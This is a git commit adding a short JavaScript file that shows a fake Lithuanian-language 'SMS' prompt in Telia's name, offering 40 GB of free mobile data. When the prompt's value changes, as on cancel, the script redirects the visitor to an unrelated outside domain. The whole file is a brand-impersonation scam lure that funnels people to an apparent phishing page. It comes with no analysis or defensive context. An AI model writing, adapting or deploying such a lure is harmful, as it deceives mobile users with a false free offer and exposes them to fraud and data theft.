29c014f094b134c0a976562120c59b1f0a4642f8
katemj25 <mbokofficial1@gmail.com>
2025-05-12 01:34:44 -0700

    Create activate-telia-freeoffer.js

---
+++ activate-telia-freeoffer.js
@@ -0,0 +1,5 @@
+var password = 'Telia nemokamas pasiūlymas'
+password=prompt('SMS: Sveikiname, jūsų numeris yra tinkamas gauti 40 GB nemokamų duomenų 3G arba 4G SIM KORTELĖS REWARD, maloniai paspauskite OK, kad suaktyvintumėte. ','Telia nemokamas pasiūlymas');
+if (password != 'Telia nemokamas pasiūlymas') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
